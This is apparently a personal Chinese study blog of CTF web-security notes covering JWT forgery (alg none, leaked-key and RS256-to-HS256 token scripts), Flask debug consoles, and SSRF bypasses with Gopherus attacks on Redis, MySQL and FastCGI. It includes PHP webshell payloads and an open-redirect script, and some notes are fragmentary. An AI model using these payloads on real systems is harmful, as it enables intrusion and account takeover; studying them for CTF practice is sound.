`signature`由于使用了不可逆的加密算法，无法解码出原文，它的作用是**校验token有没有被篡改**。服务器端获取`header`中的加密算法之后，利用该算法加上`secretKey`对`header`，`payload`进行加密，比对加密都的数据和客户端发送过来的是否一致。注意`secretKey`只能保存在服务端，而且对于不同的加密算法其含义有所不同，一般对于MD5类型的摘要加密算法，`secretKey`实际上代表队是盐值

## JWT的种类

其实JWT(JSON Web Token)指的是一种规范，这种规范允许我们使用JWT在两个组织之间传递安全可靠的信息，JWT的具体实现可以分为以下几种：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nonsecure JWT：未经过签名，不安全的JWT</span><br><span class="line">JWS：经过签名的JWT</span><br><span class="line">JWE：payload部分经过加密的JWT</span><br></pre></td></tr></table></figure>

### nonsecure JWT

未经过签名，不安全的JWT。其header部分没有指定签名算法

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

并且也没有Signature部分

### JWS

JWS ，也就是JWT Signature，其结构就是在之前nonsecure JWT的基础上，在头部声明签名算法，并在最后添加上签名。创建签名，是保证jwt不能被他人随意篡改。我们通常使用的JWT一般都是JWS

为了完成签名，除了用到header信息和payload信息外，还需要算法的密钥，也就是secretKey。加密的算法一般有2类：

对称加密：secretKey指加密密钥，可以生成签名与验签
非对称加密：secretKey指私钥，只用来生成签名，不能用来验签(验签用的是公钥)
JWT的密钥或者密钥对，一般统一称为JSON Web Key，也就是JWK

到目前为止，jwt的签名算法有三种：

HMAC【哈希消息验证码(对称)】：HS256/HS384/HS512
RSASSA【RSA签名算法(非对称)】（RS256/RS384/RS512）
ECDSA【椭圆曲线数据签名算法(非对称)】（ES256/ES384/ES512）

### JWE

`payload`部分被加密

## JWT漏洞

### 空加密算法(nonsecure JWT)

jwt支持空加密算法，可以在header中指定alg为none，这样的花，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;None&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jinmu&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1664193697</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1664200897</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1664193697</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fa2fb0a80953bd65a5dfe2afec06048e&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">在两段编码中间用.隔开</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0=.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY3MjI0MjcwLAogICJleHAiOiAxNjY3MjMxNDcwLAogICJuYmYiOiAxNjY3MjI0MjcwLAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiOTMyODI0YWU0OTE5MTQ3NmIwNzRlMjllZGVjZjQzMzAiCn0=.</span><br></pre></td></tr></table></figure>

如果您想快速将 NumericDate 转换为日期，可以使用以下 PowerShell 命令执行此操作：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$numericDate = &#x27;1636027948&#x27;</span><br><span class="line">([DateTime](&#x27;1970,1,1&#x27;)).AddSeconds($numericDate)</span><br></pre></td></tr></table></figure>

空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。

### 密码爆破

我们可以使用`c-jwt-cracker-master`进行JWT密钥爆破

### 私钥泄露攻击

这里访问`/private.key`就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成

这里就需要在本地安装node，然后`npm install jsonwebtoken`

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">jwt</span> <span class="operator">=</span> require(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">fs</span> <span class="operator">=</span> require(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">privateKey</span> <span class="operator">=</span> fs.readFileSync(<span class="string">&quot;private.key&quot;</span>);</span><br><span class="line"><span class="type">var</span> <span class="variable">token</span> <span class="operator">=</span>jwt.sign(&#123;user:<span class="string">&#x27;admin&#x27;</span> &#125;,privateKey,&#123;algorithm:<span class="string">&#x27;RS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">console.log(token);</span><br></pre></td></tr></table></figure>

### 公钥泄露攻击

jwt中最常用的两种算法为HMAC和RSA

HMAC是一种对称加密算法，使用相同的密钥进行加解密

RSA是一种非对称加密算法，使用私钥加密，公钥解密

在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token

密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">jwt</span> <span class="operator">=</span> require(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">fs</span> <span class="operator">=</span> require(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">privateKey</span> <span class="operator">=</span> fs.readFileSync(<span class="string">&quot;public.key&quot;</span>);</span><br><span class="line"><span class="type">var</span> <span class="variable">token</span> <span class="operator">=</span>jwt.sign(&#123;user:<span class="string">&#x27;admin&#x27;</span> &#125;,privateKey,&#123;algorithm:<span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">console.log(token);</span><br></pre></td></tr></table></figure>

但是这里要注意，我们在进行密钥攻击时，一定要用post方式![307afa51c5111551e222c88701a2f22](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209262229683.png)

# 题目

## 空加密

这里补一个知识点

使用URL访问页面时

/admin 表示访问admin.php文件#这里因为没有这个文件，在ctfshow平台被自动跳转到首页

![image-20221031220909392](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221031220909392.png)

/admin/表示访问admin /目录下的文件，默认是index.php

![image-20221031220822445](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221031220822445.png)

![image-20221031215515833](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221031215515833.png)

直接改为

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;iat&quot;: 1667224270,</span><br><span class="line">  &quot;exp&quot;: 1667231470,</span><br><span class="line">  &quot;nbf&quot;: 1667224270,</span><br><span class="line">  &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;jti&quot;: &quot;932824ae49191476b074e29edecf4330&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

然后base64编码

## 密码爆破

就是对密钥进行猜测

![image-20221031215925174](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221031215925174.png)

modprobe kvm

## 私钥泄露

### 利用公钥私钥解密

访问/private.key   /public.key

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://f86be22f-fd82-48a7-a764-23d8f76ecd98.challenge.ctf.show//private.key</span><br></pre></td></tr></table></figure>

### 利用私钥生成公钥

js脚本

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const jwt = require(&quot;jsonwebtoken&quot;);</span><br><span class="line">var fs = require(&quot;fs&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var privateKey = fs.readFileSync(&quot;private.key&quot;); </span><br><span class="line">var token = jwt.sign(&#123;user:&#x27;admin&#x27;&#125;,privateKey,&#123;algorithm:&#x27;RS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">console.log(token);</span><br></pre></td></tr></table></figure>

脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.AH4YkjLWhtkoxco48abhQ7MUfxBgyfP3OffsS6cZmHtfLpVlv9t8bZAnW-CVbLkHfu4vzQI_OiPdBQP-a3xJIOq3hf0jsMAsijn-XKaaDZtv3cg4a0RvjpEHLYCN89KpigGHC0vtOb6OzffdmkPVN8vcYJby742vD_YhDDHw6pU</span><br></pre></td></tr></table></figure>

## 公钥泄露攻击

![image-20221101091552872](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221101091552872.png)

在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了，加密时的私钥才有可能伪造token。

密钥一般情况下是无法直接获取到的，但是如果可以获取到公钥 

2.54.28

# XXE



![image-20221109174007978](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221109174007978.png)

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 开发时间：2022/11/6 18:15</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &quot;Index Page&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/hello&quot;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def hello():</span><br><span class="line">    name = request.form[&#x27;name&#x27;]</span><br><span class="line">    return f&#x27;hello &#123;name&#125;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=80)</span><br></pre></td></tr></table></figure>

## flask调试模式

![image-20221109211603159](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221109211603159.png)

调试时可以访问/console

要PIN

![image-20221109211725653](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221109211725653.png)

这里有

![image-20221109211716323](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221109211716323.png)

flask静态文件

flask模板

# SSRF（服务器伪造请求）

有服务端发送

## ssrf基础

![image-20221119212127399](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221119212127399.png)

### SSRF的产生

SSRF是一种由攻击者构造形成，由服务daunt发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（正是因为他有服务器端发起的，所以它能够请求到与他相连而与外网隔离的内部系统）

### SSRF的危害

1，可以对外网服务器所在的内网，某些情况下端口的Banner会回显出来。

2，攻击运行在内网或者本地的应用程序。

3，对内网web应用进行指纹识别。

4，攻击内外网的web应用。

5，利用file协议读取本地文件等。

## 危害与利用

### 端口扫描(不会)

对外网、服务器所在内网、本地、进行端口扫描

### 攻击内网、本地漏洞服务（不会）

攻击运行在内网或本地的应用程序（溢出、弱口令）

### 利用Gopher协议拓展攻击面

内网Web应用指纹识别、攻击漏洞应用
访问默认文件，对内网web应用进行指纹识别（框架，平台，模块以及CMS等 ）

攻击内外网的web应用，主要是使用get参数就可以实现的攻击（如struts2，sqli等）;

第一步，应用指纹识别---->第二步，寻找漏洞----->第三步，漏洞利用

### 文件读取

读取本地文件，利用file协议读取本地文件，提交参数等。

## 防护与绕过

### 防护

使用正则表达式的方式对SSRF中的请求地址进行过滤

eg：限制请求特定域名、禁止请求内网IP。

### 绕过

#### 方式一：使用特殊格式绕过

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">htttp://example.com@evil.com</span><br><span class="line">//ttt是特殊格式？</span><br></pre></td></tr></table></figure>

#### 方法二：IP地址转换为进制及IP地址省略绕过

原始：地址127.0.0.1

八进制：0177.00.00.01

十进制：2130706433

十六进制：0x7f.0x0.0x0.0x1

IP地址省略写法：127.1

#### 方法三：域名的配置

有可控域名A，将域名A记录指向欲请求的IP进行绕过操作

evil.example.com => 10.10.11.11

## 相关函数和类

- file_get_contents (): 将整个文件或一个 url 所指向的文件读入一个字符串中
- readfile (): 输出一个文件的内容
- fsockopen (): 打开一个网络连接或者一个 Unix 套接字连接
- curl_exec (): 初始化一个新的会话，返回一个 cURL 句柄，供 curl_setopt () curl_exec () 和 curl_close () 函数使用
- fopen (): 打开一个文件或者 url
- PHP 原生类 soapclient 在触发反序列化时可导致 ssrf

## 相关协议

file协议: 在有回显的情况下，利用file协议可以读取任意文件的内容

dict 协议：泄露安装软件版本信息，查看端口，操作内网任意端口访问相应的文件

gopher 协议：gopher支持发出get post 请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议，（俗称万能协议）可以用于反弹shell

http/s 协议：探测内网主机存活

## 利用方式

让服务端去访问相应的网址

让服务端取访问自己所出内网的一些指纹文件来判断是否存在相应的cms

可以使用file dict gopher ftp 协议进行请求访问相应的文件

攻击内网web应用(可以向内部任意主机的任意端口发送精心构造的数据包{payload})

攻击内网应用程序（利用跨协议通讯技术）

判断内网主机是否存活：方法是看是否有端口开放

Dos攻击(请求大文件，始终保持连接keep-alive-always)

**例题**![image-20221119220724707](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221119220724707.png)

![image-20221119220720129](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221119220720129.png)

首先会询问是反弹shell还是PHPshell,这里我们选PHPshell

要一个默认地址，我们直接默认就好回车

然后要一个payload,我们写入<?php eval($_POST[1]);?>，并且给出了文件名/shell.php
<p>然后给了我们payload我们可以取发包了，但是注意我们这里要进行二次编码，为什么呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为他进行了两次解码,我们在发送到redis要经过一个服务器的转发,比如这里是nginx转发,在我们传输到nginx时就进行了一次url解码,再发送给redis时,又进行了一次解码,所以我们要进行两次编码.</span><br></pre></td></tr></table></figure>
<p>攻击MYSQL 3306端口</p>
<p>MYSQL分为客户端和服务端，由客户端连接服务器有四种方式，分别是</p>
<ul>
<li>unix套接字</li>
<li>内存共享</li>
<li>命令管道</li>
<li>TCP/IP套接字</li>
</ul>
<p>我们进行攻击依靠第四种方式，Mysql客户端连接时，有两种情况：</p>
<p>里攻击MySQL要在非交互条件下进行,一定只能攻击没有密码的的MySQL服务端</p>
<p>这里我们写马要用MySQL语句写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python.exe ./Gopherus-master/gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);&quot; into outfile &#x27;/var/www/html/1.php&#x27;;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232233930.png" alt="image-20220923223307726"></p>
<h5 id="攻击fastcgi的9000端口">攻击fastcgi的9000端口</h5>
<blockquote>
<p>astcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器.</p>
</blockquote>
<p>可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件</p>
<p>ssrf-&gt;控制服务端脚本请求本地php-fpm端口-&gt;伪造配置参数包含php://input数据-&gt;执行php://input内提交的代码</p>
<p>这里还是使用gopherus</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251615362.png" alt="image-20220925161538070"></p>
<h2 id="ssrf的绕过">ssrf的绕过</h2>
<h3 id="使用enclosed-alphanumerics绕过数字限制">使用<code>enclosed alphanumerics</code>绕过数字限制</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>比如我们访问127.0.0.1可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.⓿.⓿.1</span><br></pre></td></tr></table></figure>
<p>但是我没ping出来<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221119232928176.png" alt="image-20221119232928176"></p>
<p>IP地址有一些特殊的写法,在Windows下,0代表0.0.0.0,而在Linux下,0代表的是127.0.0.1</p>
<p>127.⓿.⓿.1</p>
<p>可以忽略<code>0.0</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.1</span><br></pre></td></tr></table></figure>
<h3 id="IP地址进制绕过">IP地址进制绕过</h3>
<p>IP地址可以转int也可以转不同进制来表示</p>
<p>比如我们使用这个<a target="_blank" rel="noopener" href="http://www.tbfl.store/net/ip.html">http://www.tbfl.store/net/ip.html</a> 来转一下127.0.0.1<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221119233146083.png" alt="image-20221119233146083"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221119233137969.png" alt="image-20221119233137969"></p>
<p>这里我只有后面两个成功了</p>
<h4 id="302跳转">302跳转</h4>
<p>这个没懂</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以跳转到内网中，比如302.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$schema = $_GET[&#x27;s&#x27;];</span><br><span class="line">$ip = $_GET[&#x27;i&#x27;];</span><br><span class="line">$port = $_GET[&#x27;p&#x27;];</span><br><span class="line">$query = $_GET[&#x27;q&#x27;];</span><br><span class="line"></span><br><span class="line">if(empty($port))&#123;</span><br><span class="line"></span><br><span class="line">  header(&quot;Location: $schema://$ip/$query&quot;);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">  header(&quot;Location: $schema://$ip:$port/$query&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果服务器跟踪了location字段,就可以自动转向</p>
<h4 id="短网址绕过">短网址绕过</h4>
<p>网上有很多转换短网址的工具随便百度一个就有</p>
<p>比如说<code>http://charmersix.icu/</code>转换成<code>http://jj6m.cn/e0fSu</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io">Jinmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io/Web/web%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0WEB/">https://jinmu1108.github.io/Web/web%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0WEB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinmu1108.github.io" target="_blank">J1Nmu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/Web/SQL/SQL/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/Crypto/AES/Crypto-AES/" title="Crypto-AES"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title">Crypto-AES</div></div></a></div><div><a href="/Crypto/RSA/Crypto-RSA/" title=""><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title"></div></div></a></div><div><a href="/Crypto/%E7%90%86%E8%AE%BA/Crypto%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="Crypto理论知识"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-18</div><div class="title">Crypto理论知识</div></div></a></div><div><a href="/Web/JWT/JWT/" title="JWT"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-18</div><div class="title">JWT</div></div></a></div><div><a 